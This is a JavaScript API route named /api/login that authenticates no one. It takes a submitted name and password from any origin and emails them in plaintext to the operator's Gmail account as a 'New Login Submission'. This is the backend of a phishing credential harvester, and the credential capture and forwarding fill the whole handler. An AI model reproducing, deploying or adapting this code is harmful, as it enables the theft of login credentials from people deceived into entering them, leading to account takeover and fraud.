import nodemailer from 'nodemailer';
import cors from 'cors';

const corsMiddleware = cors({ origin: '*', methods: ['POST'] });

const runMiddleware = (req, res, fn) => {
  return new Promise((resolve, reject) => {
    fn(req, res, (result) => {
      if (result instanceof Error) return reject(result);
      return resolve(result);
    });
  });
};

const validateInput = (name, password) => {
  

  if (
    !password ||
    typeof password !== 'string' ||
    password.length < 6
  ) {
    return 'Password must be a string with at least 6 characters';
  }

  return null;
};


export default async function handler(req, res) {
  await runMiddleware(req, res, corsMiddleware);
  console.log('API /api/login called with method:', req.method); // Debug log
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { name, password } = req.body;
  const validationError = validateInput(name, password);
  if (validationError) {
    return res.status(400).json({ message: validationError });
  }

  const sanitizedName = name.trim();
  const sanitizedPassword = password.trim();

  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: 'New Login Submission',
      text: `New login details:\nName: ${sanitizedName}\nPassword: ${sanitizedPassword}`,
      html: `<h3>New Login Submission</h3><p><strong>Name:</strong> ${sanitizedName}</p><p><strong>Password:</strong> ${sanitizedPassword}</p>`,
    };

    await transporter.sendMail(mailOptions);
    return res.status(200).json({ message: 'Login details sent successfully' });
  } catch (error) {
    console.error('Error sending email:', error);
    return res.status(500).json({ message: 'Failed to send email', error: error.message });
  }
}
